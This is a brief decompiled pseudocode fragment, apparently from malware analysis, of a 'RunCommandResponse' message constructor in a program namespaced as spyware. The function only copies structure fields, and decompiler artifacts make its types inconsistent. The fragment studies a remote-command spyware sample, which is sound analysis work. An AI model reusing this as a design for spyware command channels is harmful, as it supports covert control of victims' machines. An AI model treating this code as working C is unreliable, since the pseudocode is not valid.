double spyware::communication::messages::Message::RunCommandResponse(long long a0, long long a1)
{
    int v1;  // xmm0
    int v2;  // xmm1

    *((unsigned long long *)((char *)&a0->field_28 + 8)) = a1->field_30;
    v1 = a1->field_0;
    v2 = a1->field_10;
    *((uint128_t *)((char *)&a0->field_18 + 8)) = a1->field_20;
    *((void*)((char *)&a0->field_8 + 8)) = v2;
    *((void*)&(&a0->field_0)[1]) = v1;
    a0->field_0 = 9223372036854775809;
    return (unsigned long long)v1;
}
